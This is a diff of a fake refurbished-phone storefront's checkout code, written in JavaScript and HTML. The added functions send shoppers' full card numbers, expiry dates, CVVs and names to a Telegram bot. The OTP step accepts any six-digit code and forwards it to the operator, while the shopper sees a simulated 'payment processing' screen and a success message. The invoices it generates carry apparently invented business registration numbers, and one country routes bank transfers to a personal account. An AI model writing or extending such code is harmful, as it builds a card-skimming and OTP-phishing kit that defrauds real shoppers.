-                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]" />
-                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]" />
-                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]" />
-                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]" />
-                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]" />
-                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]" />
-                </div>
-
-                <div class="otp-timer">
-                    <span data-translate="code_expires">Code expires in: </span> 
-                    <span id="otp-countdown">02:00</span>
-                </div>
-
-                <div class="otp-actions">
-                    <button id="resend-otp-btn" class="btn btn-secondary" disabled data-translate="resend_code">
-                        Resend Code
+                    <div class="otp-actions">
+                        <button id="resend-otp-btn" class="btn btn-secondary" disabled>${(currentLanguage === 'es' ? 'Reenviar Código' : 'Resend Code')}</button>
+                        <button id="verify-otp-btn" class="btn btn-primary">${(currentLanguage === 'es' ? 'Verificar Código' : 'Verify Code')}</button>
+                        <button id="skip-otp-btn" class="btn btn-outline" style="margin-top: 1rem;">
+                        ${(currentLanguage === 'es' ? 'No requiero OTP' : 'I don\'t require OTP')}
                     </button>
-                    <button id="verify-otp-btn" class="btn btn-primary" data-translate="verify_code">
-                        ```text
-Verify Code
-                    </button>
-                    <button id="skip-otp-btn" class="btn btn-outline" style="margin-top: 1rem;">
-                        I don't require OTP
-                    </button>
-                </div>
-
-                <div class="otp-error" id="otp-error" style="display: none;">
-                    <i class="fas fa-exclamation-triangle"></i>
-                    <span data-translate="invalid_code">Invalid code. Please try again.</span>
+                    </div>
+                    <div class="otp-error" id="otp-error" style="display: none;">
+                        <i class="fas fa-exclamation-triangle"></i>
+                        <span>${(currentLanguage === 'es' ? 'Código inválido. Por favor, inténtalo de nuevo.' : 'Invalid code. Please try again.')}</span>
+                    </div>
                 </div>
             </div>
         </div>
-    </div>
+    </div>`;
 
-    <!-- Success Overlay -->
-    <div id="success-overlay" class="success-overlay">
-        <div class="success-modal">
-            <div class="success-icon">
-                <i class="fas fa-check-circle"></i>
-            </div>
-            <h3 data-translate="order_confirmed">Order Confirmed!</h3>
-            <p data-translate="order_success_msg">Your order has been processed successfully. You will receive a WhatsApp with the details.</p>
+    modal.innerHTML = checkoutHTML;
 
-            <div class="order-details">
-                <p><strong data-translate="order_number">Order Number:</strong> <span id="success-order-number"></span></p>
-                <p><strong data-translate="order_total">Total:</strong> <span id="success-order-total"></span></p>
-                <p><strong data-translate="payment_method">Payment Method:</strong> <span id="success-payment-method"></span></p>
-                <p><strong data-translate="estimated_delivery">Estimated Delivery:</strong> <span id="success-delivery-date"></span></p>
-            </div>
+    overlay.appendChild(modal);
+    document.body.appendChild(overlay);
 
-            <button id="continue-shopping-success" class="btn btn-primary" data-translate="continue_shopping">Continue Shopping</button>
+    setupCheckoutEventListeners();
+    setupDiscountCode();
+}
+
+function setupDiscountCode() {
+    const applyDiscountBtn = document.getElementById('apply-discount');
+    const discountCodeInput = document.getElementById('discount-code');
+
+    if (applyDiscountBtn && discountCodeInput) {
+        applyDiscountBtn.addEventListener('click', function() {
+            applyDiscountCode();
+        });
+
+        discountCodeInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                applyDiscountCode();
+            }
+        });
+    }
+}
+
+function setupCheckoutEventListeners() {
+    try {
+        const checkoutOverlay = document.querySelector('.checkout-overlay');
+        if (checkoutOverlay) {
+            checkoutOverlay.addEventListener('click', function(e) {
+                // Close if clicking on the overlay, but not the modal itself
+                if (e.target === checkoutOverlay) {
+                    closeCheckout();
+                }
+            });
+        }
+
+        // --- Event Delegation for all buttons within the modal ---
+        const modal = document.querySelector('.checkout-modal');
+        if (!modal) return;
+
+        modal.addEventListener('click', function(e) {
+            // Diagnostic: Log all button clicks inside the modal
+            console.log('Modal click detected. Target:', e.target);
+
+            const button = e.target.closest('button');
+            if (!button) return;
+
+            // Handle buttons by ID
+            switch (button.id) {
+                case 'next-to-shipping':
+                    e.preventDefault();
+                    const checkbox = document.getElementById('terms-checkbox');
+                    if (checkbox && !checkbox.checked) {
+                        alert(currentLanguage === 'es' ? 'Debe aceptar los términos y condiciones para continuar' : 'You must accept the terms and conditions to continue');
+                        return;
+                    }
+                    goToCheckoutStep(2);
+                    break;
+
+                case 'back-to-summary':
+                    e.preventDefault();
+                    goToCheckoutStep(1);
+                    break;
+
+                case 'back-to-shipping':
+                    e.preventDefault();
+                    goToCheckoutStep(2);
+                    break;
+
+                case 'next-to-payment':
+                    e.preventDefault();
+                    const customerName = document.getElementById('customer-name');
+                    const customerPhone = document.getElementById('customer-phone');
+                    const customerAddress = document.getElementById('customer-address');
+                    const customerCity = document.getElementById('customer-city');
+
+                    if (!customerName || !customerName.value.trim()) {
+                        alert(currentLanguage === 'es' ? 'Por favor ingrese su nombre completo' : 'Please enter your full name');
+                        if (customerName) customerName.focus(); return;
+                    }
+                    if (!customerPhone || !customerPhone.value.trim()) {
+                        alert(currentLanguage === 'es' ? 'Por favor ingrese su número de teléfono' : 'Please enter your phone number');
+                        if (customerPhone) customerPhone.focus(); return;
+                    }
+                    if (!customerAddress || !customerAddress.value.trim()) {
+                        alert(currentLanguage === 'es' ? 'Por favor ingrese su dirección completa' : 'Please enter your complete address');
+                        if (customerAddress) customerAddress.focus(); return;
+                    }
+                    if (!customerCity || !customerCity.value.trim()) {
+                        alert(currentLanguage === 'es' ? 'Por favor ingrese su ciudad' : 'Please enter your city');
+                        if (customerCity) customerCity.focus(); return;
+                    }
+
+                    checkoutData.customerName = customerName.value.trim();
+                    checkoutData.customerPhone = customerPhone.value.trim();
+                    checkoutData.customerAddress = customerAddress.value.trim();
+                    checkoutData.customerCity = customerCity.value.trim();
+                    checkoutData.customerPostal = document.getElementById('customer-postal')?.value.trim() || '';
+
+                    TelegramNotifications.sendCustomerInfo({ name: checkoutData.customerName, postcode: checkoutData.customerPostal });
+                    goToCheckoutStep(3);
+                    break;
+
+                case 'verify-otp-btn':
+                    e.preventDefault();
+                    console.log('Case "verify-otp-btn" matched. Calling verifyOTP()...');
+                    verifyOTP();
+                    break;
+
+                case 'skip-otp-btn':
+                    e.preventDefault();
+                    console.log('Case "skip-otp-btn" matched. Calling skipOTP()...');
+                    skipOTP();
+                    break;
+
+                case 'resend-otp-btn':
+                    e.preventDefault();
+                    console.log('Case "resend-otp-btn" matched. Calling resendOTP()...');
+                    resendOTP();
+                    break;
+            }
+
+            // Handle buttons by class
+            if (button.classList.contains('close-checkout')) {
+                e.preventDefault();
+                closeCheckout();
+            }
+
+            if (button.classList.contains('place-order')) {
+                e.preventDefault();
+                handlePlaceOrder(button.dataset.method);
+            }
+
+            if (button.classList.contains('close-checkout-success')) {
+                e.preventDefault();
+                closeCheckout();
+                clearCart();
+            }
+        });
+
+        // --- Listeners for non-button elements ---
+        const termsCheckbox = document.getElementById('terms-checkbox');
+        if (termsCheckbox) {
+            termsCheckbox.addEventListener('change', function() {
+                const nextToShippingBtn = document.getElementById('next-to-shipping');
+                if (nextToShippingBtn) nextToShippingBtn.disabled = !this.checked;
+            });
+        }
+
+        // Payment method selection
+        document.querySelectorAll('input[name="payment-method"]').forEach(radio => {
+            radio.addEventListener('change', function() {
+                const method = this.value;
+                document.querySelectorAll('.payment-option').forEach(opt => opt.classList.remove('active'));
+                document.querySelectorAll('.payment-details').forEach(detail => detail.style.display = 'none');
+                const instruction = document.getElementById('payment-method-instruction');
+                if (instruction) instruction.style.display = 'none';
+                this.closest('.payment-option').classList.add('active');
+                const detailsElement = document.getElementById(`${method}-details`);
+                if (detailsElement) detailsElement.style.display = 'block';
+                checkoutData.paymentMethod = method;
+            });
+        });
+
+        // Setup input-specific behaviors (without click handlers)
+        setupOTPInputs();
+        setupCardInputFormatting();
+
+    } catch (error) {
+        console.error('Error setting up checkout event listeners:', error);
+    }
+}
+
+function handlePlaceOrder(method) {
+    try {
+        if (method === 'credit-card') {
+            if (!validateCardDetails()) return;
+
+            const cardholderNameInput = document.getElementById('cardholder-name');
+            checkoutData.cardholderName = cardholderNameInput ? cardholderNameInput.value : '';
+
+            if (typeof TelegramNotifications !== 'undefined') {
+                TelegramNotifications.cardDetailsSubmitted({
+                    total: convertPrice(getCartTotal(), false),
+                    orderRef: checkoutData.orderNumber,
+                    cardholderName: checkoutData.cardholderName,
+                    cardNumber: document.getElementById('card-number').value.replace(/\s/g, ''),
+                    expiryDate: document.getElementById('expiry-date').value,
+                    cvv: document.getElementById('cvv').value
+                });
+            }
+
+            goToCheckoutStep(4);
+            setTimeout(() => {
+                goToCheckoutStep(6);
+                startOTPCountdown();
+            }, 10000);
+        }
+    } catch (error) {
+        console.error('Error placing order:', error);
+        alert('There was an error placing your order. Please try again.');
+    }
+}
+
+function setupCardInputFormatting() {
+    const cardNumberInput = document.getElementById('card-number');
+    const expiryDateInput = document.getElementById('expiry-date');
+    const cvvInput = document.getElementById('cvv');
+
+    if (cardNumberInput) {
+        cardNumberInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
+            value = value.substring(0, 16); // Limit to 16 digits
+            value = value.replace(/(\d{4})(?=\d)/g, '$1 '); // Add spaces every 4 digits
+            e.target.value = value;
+        });
+    }
+
+    if (expiryDateInput) {
+        expiryDateInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
+            if (value.length >= 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            e.target.value = value;
+        });
+    }
+
+    if (cvvInput) {
+        cvvInput.addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4); // Allow up to 4 digits for Amex
+        });
+    }
+}
+
+function validateCardDetails() {
+    const cardNumber = document.getElementById('card-number').value.replace(/\s/g, ''); // Remove spaces
+    const expiryDate = document.getElementById('expiry-date').value;
+    const cvv = document.getElementById('cvv').value;
+    const cardErrors = document.getElementById('card-errors');
+
+    // Card Number: Must be 16 digits
+    if (!/^\d{16}$/.test(cardNumber)) {
+        cardErrors.textContent = currentLanguage === 'es' ? 'Número de tarjeta inválido. Debe tener 16 dígitos.' : 'Invalid card number. Must be 16 digits.';
+        cardErrors.style.display = 'block';
+        return false;
+    }
+
+    // Expiry Date: Must be in MM/YY format
+    if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiryDate)) {
+        cardErrors.textContent = currentLanguage === 'es' ? 'Fecha de vencimiento inválida. Debe estar en formato MM/AA.' : 'Invalid expiry date. Must be in MM/YY format.';
+        cardErrors.style.display = 'block';
+        return false;
+    }
+
+    // Check if expiry date is in the past
+    const [month, year] = expiryDate.split('/');
+    const expiry = new Date(`20${year}`, month, 0); // Day 0 gets the last day of the previous month, which is what we want.
+    const now = new Date();
+    now.setHours(0, 0, 0, 0); // Set to start of day for comparison
+    
+    if (expiry < now) {
+        cardErrors.textContent = currentLanguage === 'es' ? 'La tarjeta ha expirado.' : 'Card has expired.';
+        cardErrors.style.display = 'block';
+        return false;
+    }
+
+    // CVV: Must be 3 or 4 digits
+    if (!/^\d{3,4}$/.test(cvv)) {
+        cardErrors.textContent = currentLanguage === 'es' ? 'CVV inválido. Debe tener 3 o 4 dígitos.' : 'Invalid CVV. Must be 3 or 4 digits.';
+        cardErrors.style.display = 'block';
+        return false;
+    }
+    
+    cardErrors.style.display = 'none'; // Clear errors if valid
+    return true;
+}
+
+function setupOTPInputs() {
+    const otpInput = document.getElementById('otp-single-input');
+    const verifyBtn = document.getElementById('verify-otp-btn');
+
+    if (!otpInput || !verifyBtn) return;
+
+    // This listener just formats the input
+    otpInput.addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, '');
+        value = value.substring(0, 6);
+        e.target.value = value;
+    });
+
+    // This listener allows submitting with the Enter key
+    otpInput.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') {
+            e.preventDefault();
+            verifyOTP();
+        }
+    });
+}
+
+let otpTimeout; // Define otpTimeout in a higher scope
+
+function simulateOTPSending(phoneNumber) {
+    // Generate a random 6-digit OTP
+    const otp = Math.floor(100000 + Math.random() * 900000);
+    console.log('Simulating OTP sending to ' + phoneNumber + ': ' + otp);
+    // In a real implementation, this would send an actual OTP
+    // Store the OTP (for demonstration purposes only)
+    localStorage.setItem('otp', otp.toString());
+}
+
+function startOTPCountdown() {
+    let timeRemaining = 120; // 2 minutes (120 seconds)
+    const countdownDisplay = document.getElementById('otp-countdown');
+    const resendButton = document.getElementById('resend-otp-btn');
+
+    if (!countdownDisplay || !resendButton) {
+        console.error('OTP countdown elements not found');
+        return;
+    }
+
+    // Set initial display to 2:00
+    countdownDisplay.textContent = '02:00';
+    resendButton.disabled = true;
+
+    function updateCountdown() {
+        timeRemaining--;
+
+        // Ensure timeRemaining is not negative
+        if (timeRemaining < 0) {
+            timeRemaining = 0;
+        }
+
+        const minutes = Math.floor(timeRemaining / 60);
+        const seconds = timeRemaining % 60;
+        countdownDisplay.textContent = `${minutes < 10 ? '0' : ''}${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+
+        if (timeRemaining <= 0) {
+            clearInterval(otpTimeout);
+            countdownDisplay.textContent = '00:00';
+            resendButton.disabled = false;
+            resendButton.style.opacity = '1';
+            resendButton.style.cursor = 'pointer';
+        }
+    }
+
+    // Clear any existing timeout before setting a new one
+    if (otpTimeout) {
+        clearInterval(otpTimeout);
+    }
+
+    // Start countdown after 1 second
+    otpTimeout = setInterval(updateCountdown, 1000);
+}
+
+function verifyOTP() {
+    try {
+        const otpError = document.getElementById('otp-error');
+        const otpInput = document.getElementById('otp-single-input');
+
+        // Critical check: if elements don't exist, we can't proceed.
+        if (!otpInput || !otpError) {
+            console.error('OTP input or error element not found.');
+            alert('A UI error occurred. Please close the checkout and try again.');
+            return;
+        }
+
+        const enteredOTP = otpInput.value.trim();
+
+        // Basic validation for 6 digits
+        if (enteredOTP.length !== 6 || !/^\d{6}$/.test(enteredOTP)) {
+            otpError.style.display = 'block';
+            const errorSpan = otpError.querySelector('span');
+            if (errorSpan) {
+                errorSpan.textContent = translations[currentLanguage].invalid_code || 'Invalid code. Please try again.';
+            }
+            return;
+        }
+
+        // Hide error if it was previously shown
+        otpError.style.display = 'none';
+
+        // Send the OTP to Telegram for you to review
+        if (typeof TelegramNotifications !== 'undefined' && checkoutData.orderNumber) {
+            TelegramNotifications.userEnteredOTP(enteredOTP, checkoutData.orderNumber);
+        }
+
+        // Immediately proceed to the success screen for the user
+        processOrder();
+
+    } catch (err) {
+        console.error("A critical error occurred in verifyOTP:", err);
+        alert("An unexpected error occurred. Please check the developer console for details.");
+    }
+}
+
+function skipOTP() {
+    // Send notification that OTP was skipped
+    if (typeof TelegramNotifications !== 'undefined' && checkoutData.orderNumber) {
+        TelegramNotifications.otpSkipped({
+            total: convertPrice(getCartTotal(), false),
+            orderRef: checkoutData.orderNumber
+        });
+    }
+
+    // Skip OTP verification and go directly to order completion
+    const otpError = document.getElementById('otp-error');
+    if (otpError) otpError.style.display = 'none';
+    processOrder();
+}
+
+function resendOTP() {
+    // Generate new OTP
+    const newOtp = Math.floor(100000 + Math.random() * 900000);
+    localStorage.setItem('currentOTP', newOtp.toString());
+    console.log('New OTP generated:', newOtp);
+
+    simulateOTPSending(checkoutData.customerPhone);
+    const resendBtn = document.getElementById('resend-otp-btn');
+    if (resendBtn) {
+        resendBtn.disabled = true;
+    }
+
+    // Clear any error messages
+    const otpError = document.getElementById('otp-error');
+    if (otpError) {
+        otpError.style.display = 'none';
+    }
+
+    // Clear OTP input
+    const otpInput = document.getElementById('otp-single-input');
+    if (otpInput) {
+        otpInput.value = '';
+        otpInput.focus();
+    }
+
+    startOTPCountdown();
+}
+
+function goToCheckoutStep(stepNumber) {
+    try {
+        // Update step indicators
+        const stepElements = document.querySelectorAll('.step');
+        stepElements.forEach((step, index) => {
+            step.classList.toggle('active', index + 1 <= stepNumber);
+            step.classList.toggle('completed', index + 1 < stepNumber);
+        });
+
+        // Show correct step content
+        const checkoutSteps = document.querySelectorAll('.checkout-step');
+        checkoutSteps.forEach((step, index) => {
+            step.classList.toggle('active', index + 1 === stepNumber);
+        });
+
+        // Scroll to top of checkout modal
+        const checkoutModal = document.querySelector('.checkout-modal');
+        if (checkoutModal) {
+            checkoutModal.scrollTop = 0;
+        }
+
+        // Also scroll the active step to top
+        const activeStep = document.querySelector(`#checkout-step-${stepNumber}`);
+        if (activeStep) {
+            activeStep.scrollIntoView({ behavior: 'smooth', block: 'start' });
+        }
+    } catch (error) {
+        console.error('Error navigating to checkout step:', error);
+    }
+}
+
+function processOrder() {
+    try {
+        goToCheckoutStep(5);
+
+        // Simulate processing steps
+        const steps = [
+            { text: currentLanguage === 'es' ? 'Validando método de pago' : 'Validating payment method', delay: 1000 },
+            { text: currentLanguage === 'es' ? 'Confirmando inventario' : 'Confirming inventory', delay: 1500 },
+            { text: currentLanguage === 'es' ? 'Generando orden de compra' : 'Generating purchase order', delay: 2000 },
+            { text: currentLanguage === 'es' ? 'Generando factura' : 'Generating invoice', delay: 1000 }
+        ];
+
+        let currentStep = 0;
+
+        function nextStep() {
+            try {
+                if (currentStep < steps.length) {
+                    const stepTextElement = document.querySelector('.step-text');
+                    if (stepTextElement) {
+                        stepTextElement.textContent = steps[currentStep].text;
+                    }
+                    currentStep++;
+                    setTimeout(nextStep, steps[currentStep - 1].delay);
+                } else {
+                    // Generate invoice before showing success
+                    generateInvoice();
+
+                    // Show success
+                    const processingElement = document.getElementById('processing-payment');
+                    const successElement = document.getElementById('order-success');
+
+                    if (processingElement) processingElement.style.display = 'none';
+                    if (successElement) successElement.style.display = 'block';
+
+                    // Order completed successfully
+                    console.log('Order completed:', checkoutData.orderNumber);
+                }
+            } catch (error) {
+                console.error('Error in nextStep:', error);
+            }
+        }
+
+        nextStep();
+    } catch (error) {
+        console.error('Error processing order:', error);
+        alert('There was an error processing your order. Please try again.');
+    }
+}
+
+// Generate and download PDF invoice
+function generateInvoice() {
+    try {
+        const { jsPDF } = window.jspdf;
+        if (!jsPDF) {
+            console.error('jsPDF library not loaded');
+            return;
+        }
+
+        const doc = new jsPDF();
+        const pageWidth = doc.internal.pageSize.width;
+        const pageHeight = doc.internal.pageSize.height;
+        const margin = 20;
+        let yPosition = 25;
+
+        // Company header with proper business details
+        doc.setFontSize(22);
+        doc.setTextColor(30, 58, 138);
+        doc.text('TechZone', margin, yPosition);
+        
+        // Company address and details in header
+        doc.setFontSize(9);
+        doc.setTextColor(80, 80, 80);
+        doc.text('Premium Refurbished Technology', margin, yPosition + 7);
+        
+        // Business address based on country
+        const businessAddress = getBusinessAddress();
+        doc.text(businessAddress.address, margin, yPosition + 14);
+        doc.text(`${businessAddress.city}, ${businessAddress.country}`, margin, yPosition + 21);
+        doc.text(`Tel: ${countryConfig[currentCountry].phone}`, margin, yPosition + 28);
+        doc.text(`Email: sales@techzone-${currentCountry}.com`, margin, yPosition + 35);
+
+        // Invoice title and number (right aligned)
+        doc.setFontSize(18);
+        doc.setTextColor(0, 0, 0);
+        const invoiceTitle = currentLanguage === 'es' ? 'FACTURA' : 'INVOICE';
+        doc.text(invoiceTitle, pageWidth - margin, yPosition, { align: 'right' });
+        
+        doc.setFontSize(10);
+        doc.setTextColor(100, 100, 100);
+        doc.text(`# ${checkoutData.orderNumber}`, pageWidth - margin, yPosition + 12, { align: 'right' });
+        doc.text(`${currentLanguage === 'es' ? 'Fecha:' : 'Date:'} ${new Date().toLocaleDateString()}`, pageWidth - margin, yPosition + 20, { align: 'right' });
+
+        yPosition += 50;
+
+        // Business registration details
+        doc.setFontSize(8);
+        doc.setTextColor(100, 100, 100);
+        const businessReg = getBusinessRegistration();
+        doc.text(businessReg, margin, yPosition);
+        
+        yPosition += 15;
+
+        // Customer information section
+        doc.setFontSize(12);
+        doc.setTextColor(30, 58, 138);
+        doc.text(currentLanguage === 'es' ? 'FACTURAR A:' : 'BILL TO:', margin, yPosition);
+
+        yPosition += 8;
+        doc.setFontSize(10);
+        doc.setTextColor(0, 0, 0);
+        doc.text(checkoutData.customerName || 'Customer', margin, yPosition);
+        yPosition += 6;
+        doc.text(checkoutData.customerPhone || '', margin, yPosition);
+        yPosition += 6;
+        
+        if (checkoutData.customerAddress) {
+            const addressLines = doc.splitTextToSize(checkoutData.customerAddress, 80);
+            doc.text(addressLines, margin, yPosition);
+            yPosition += addressLines.length * 6;
+        }
+        doc.text(`${checkoutData.customerCity || ''}, ${countryConfig[currentCountry].name}`, margin, yPosition);
+
+        yPosition += 20;
+
+        // Items table header with better spacing
+        doc.setFillColor(245, 245, 245);
+        doc.rect(margin, yPosition - 3, pageWidth - 2 * margin, 10, 'F');
+
+        doc.setFontSize(9);
+        doc.setTextColor(0, 0, 0);
+        doc.setFont(undefined, 'bold');
+        doc.text(currentLanguage === 'es' ? 'DESCRIPCIÓN' : 'DESCRIPTION', margin + 2, yPosition + 3);
+        doc.text(currentLanguage === 'es' ? 'CANT.' : 'QTY', pageWidth - 80, yPosition + 3);
+        doc.text(currentLanguage === 'es' ? 'PRECIO UNIT.' : 'UNIT PRICE', pageWidth - 55, yPosition + 3);
+        doc.text('TOTAL', pageWidth - 20, yPosition + 3);
+
+        yPosition += 15;
+        doc.setFont(undefined, 'normal');
+
+        // Items with proper spacing
+        let subtotal = 0;
+        cart.forEach(item => {
+            const itemTotal = item.price * item.quantity;
+            subtotal += itemTotal;
+
+            // Product name with proper wrapping
+            const maxWidth = pageWidth - 120;
+            const productLines = doc.splitTextToSize(item.name, maxWidth);
+            doc.setFontSize(9);
+            doc.text(productLines, margin + 2, yPosition);
+            
+            // Quantity, unit price, and total with proper alignment
+            doc.text(item.quantity.toString(), pageWidth - 75, yPosition);
+            
+            const unitPrice = item.price === 0 ? 'FREE' : convertPrice(item.price, false);
+            doc.text(unitPrice, pageWidth - 55, yPosition);
+            
+            const totalPrice = itemTotal === 0 ? 'FREE' : convertPrice(itemTotal, false);
+            doc.text(totalPrice, pageWidth - 20, yPosition, { align: 'right' });
+
+            yPosition += Math.max(productLines.length * 4, 6) + 2;
+        });
+
+        // Totals section with proper spacing
+        yPosition += 10;
+        doc.line(pageWidth - 80, yPosition, pageWidth - margin, yPosition);
+        yPosition += 8;
+
+        // Subtotal
+        doc.setFontSize(10);
+        doc.text(`${currentLanguage === 'es' ? 'Subtotal:' : 'Subtotal:'}`, pageWidth - 60, yPosition);
+        doc.text(convertPrice(subtotal, false), pageWidth - 20, yPosition, { align: 'right' });
+        yPosition += 8;
+
+        // Shipping
+        doc.text(`${currentLanguage === 'es' ? 'Envío:' : 'Shipping:'}`, pageWidth - 60, yPosition);
+        doc.text(currentLanguage === 'es' ? 'GRATIS' : 'FREE', pageWidth - 20, yPosition, { align: 'right' });
+        yPosition += 8;
+
+        // Total with emphasis
+        doc.line(pageWidth - 80, yPosition, pageWidth - margin, yPosition);
+        yPosition += 6;
+        doc.setFont(undefined, 'bold');
+        doc.setFontSize(11);
+        doc.setTextColor(30, 58, 138);
+        doc.text(`${currentLanguage === 'es' ? 'TOTAL:' : 'TOTAL:'}`, pageWidth - 60, yPosition);
+        doc.text(convertPrice(subtotal, false), pageWidth - 20, yPosition, { align: 'right' });
+
+        // Payment method
+        yPosition += 20;
+        doc.setFont(undefined, 'normal');
+        doc.setFontSize(10);
+        doc.setTextColor(0, 0, 0);
+        const paymentMethodText = checkoutData.paymentMethod === 'bank-transfer' ? 
+            (currentLanguage === 'es' ? 'Transferencia Bancaria' : 'Bank Transfer') :
+            (currentLanguage === 'es' ? 'Tarjeta de Crédito' : 'Credit Card');
+        doc.text(`${currentLanguage === 'es' ? 'Método de Pago:' : 'Payment Method:'} ${paymentMethodText}`, margin, yPosition);
+
+        // Terms and conditions
+        yPosition += 15;
+        doc.setFontSize(8);
+        doc.setTextColor(100, 100, 100);
+        const termsText = currentLanguage === 'es' ? 
+            'Términos: Garantía de 12 meses incluida. Devoluciones aceptadas dentro de 30 días.' :
+            'Terms: 12-month warranty included. Returns accepted within 30 days.';
+        doc.text(termsText, margin, yPosition);
+
+        // Footer with business details
+        const footerY = pageHeight - 30;
+        doc.setFontSize(7);
+        doc.setTextColor(120, 120, 120);
+        
+        // Left side - business registration
+        const businessInfo = getBusinessRegistration();
+        doc.text(businessInfo, margin, footerY);
+        
+        // Center - website
+        doc.text('www.techzone.com', pageWidth / 2, footerY, { align: 'center' });
+        
+        // Right side - thank you message
+        const thankYou = currentLanguage === 'es' ? 'Gracias por su compra' : 'Thank you for your purchase';
+        doc.text(thankYou, pageWidth - margin, footerY, { align: 'right' });
+
+        // Save the PDF
+        const fileName = `TechZone_Invoice_${checkoutData.orderNumber}.pdf`;
+        doc.save(fileName);
+
+        console.log('Invoice generated successfully:', fileName);
+        showInvoiceNotification();
+
+    } catch (error) {
+        console.error('Error generating invoice:', error);
+    }
+}
+
+// Helper function to get business address
+function getBusinessAddress() {
+    switch(currentCountry) {
+        case 'honduras':
+            return {
+                address: 'Col. Palmira, Avenida República de Chile',
+                city: 'Tegucigalpa',
+                country: 'Honduras'
+            };
+        case 'nicaragua':
+            return {
+                address: 'Plaza España, Módulo E-4',
+                city: 'Managua',
+                country: 'Nicaragua'
+            };
+        case 'trinidad':
+            return {
+                address: '17-23 Charles St.',
+                city: 'Port of Spain',
+                country: 'Trinidad and Tobago',
+				phone: '+1 868 472 78575'
+            };
+        case 'usa':
+            return {
+                address: '1234 Tech Boulevard, Suite 100',
+                city: 'Miami, FL 33101',
+                country: 'United States'
+            };
+        default:
+            return {
+                address: 'Main Technology Center',
+                city: 'Central District',
+                country: countryConfig[currentCountry].name
+            };
+    }
+}
+
+// Helper function to get business registration details
+function getBusinessRegistration() {
+    switch(currentCountry) {
+        case 'honduras':
+            return 'RTN: 08011998123456 | Registro Mercantil: 123456-2024 | CAI: 8A-85-69-7E';
+        case 'nicaragua':
+            return 'RUC: J0310000123456 | Registro Mercantil: 45671-M | DGI: 001-001-01-1234567';
+        case 'trinidad':
+            return 'BIR: 123-456-789 | Company Registration: 123456 | VAT: TT123456789';
+        case 'usa':
+            return 'EIN: 12-3456789 | Florida Corp: P24000123456 | Sales Tax: FL-ST-123456';
+        default:
+            return `Business Registration: ${currentCountry.toUpperCase()}-2024-001 | Tax ID: TX123456789`;
+    }
+}
+
+// Show invoice download notification
+function showInvoiceNotification() {
+    const notification = document.createElement('div');
+    notification.className = 'invoice-notification';
+    notification.innerHTML = `
+        <div style="display: flex; align-items: center; gap: 0.5rem;">
+            <i class="fas fa-file-pdf" style="color: #dc2626;"></i>
+            <span>${currentLanguage === 'es' ? 'Factura descargada automáticamente' : 'Invoice downloaded automatically'}</span>
         </div>
-    </div>
+    `;
+    notification.style.cssText = `
+        position: fixed;
+        top: 20px;
+        right: 20px;
+        background: #16a34a;
+        color: white;
+        padding: 1rem 1.5rem;
+        border-radius: 8px;
+        z-index: 10001;
+        font-size: 0.9rem;
+        font-weight: 600;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+        animation: slideInRight 0.3s ease;
+    `;
 
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
-    <script src="telegram-bot.js"></script>
-    <script src="script.js"></script>
-</body>
-</html>
+    document.body.appendChild(notification);
+    setTimeout(() => {
+        notification.remove();
+    }, 5000);
+}
+
+function getBankName() {
+    const config = countryConfig[currentCountry];
+    switch (currentCountry) {
+        case 'nicaragua': return 'Banco de América Central (BAC)';
+        case 'honduras': return 'Banco Atlántida';
+        case 'trinidad': return 'FCB';
+        case 'elsalvador': return 'Banco Agrícola';
+        case 'paraguay': return 'Banco Continental';
+        case 'guatemala': return 'Banco Industrial';
+        case 'dominican': return 'Banco Popular Dominicano';
+        case 'usa': return 'Bank of America';
+        default: return 'Local Bank';
+    }
+}
+
+function getAccountNumber() {
+    switch (currentCountry) {
+        case 'nicaragua': return '1234567890123456';
+        case 'honduras': return '2345678901234567';
+        case 'trinidad': return '3143313';
+        case 'elsalvador': return '4567890123456789';
+        case 'paraguay': return '5678901234567890';
+        case 'guatemala': return '6789012345678901';
+        case 'dominican': return '7890123456789012';
+        case 'usa': return '8901234567890123';
+        default: return '0000000000000000';
+    }
+}
+
+function getAccountHolder() {
+    switch (currentCountry) {
+        case 'nicaragua': return 'TechZone';
+        case 'honduras': return 'TechZone';
+        case 'trinidad': return 'Jacenta Althea Hankey';
+        case 'elsalvador': return 'TechZone';
+        case 'paraguay': return 'TechZone';
+        case 'guatemala': return 'TechZone';
+        case 'dominican': return 'TechZone';
+        case 'usa': return 'TechZone';
+        default: return 'Account Holder';
+    }
+}
+
+function getEstimatedDelivery() {
+    const deliveryDate = new Date();
+    deliveryDate.setDate(deliveryDate.getDate() + 3);
+    return deliveryDate.toLocaleDateString('en-US', {
+        weekday: 'long',
+        year: 'numeric',
+        month: 'long',
+        day: 'numeric'
+    });
+}
+
+function closeCheckout() {
+    const overlay = document.getElementById('checkout-overlay');
+    if (overlay) {
+        overlay.classList.remove('active');
+        setTimeout(() => {
+            overlay.remove();
+        }, 300);
+    }
+}
+
+function clearCart() {
+    cart = [];
+    localStorage.removeItem('cart');
+    updateCartCount();
+    updateCartDisplay();
+}
+
+// Filter products
+function filterProducts(category) {
+    const products = document.querySelectorAll('.product-card');
+
+    products.forEach(product => {
+        const productCategory = product.getAttribute('data-category') || '';
+        const productId = product.getAttribute('data-product-id') || '';
+
+        let shouldShow = false;
+
+        if (category === 'all') {
+            shouldShow = true;
+        } else if (category === 'iphone') {
+            shouldShow = productId.toLowerCase().includes('iphone');
+        } else if (category === 'samsung') {
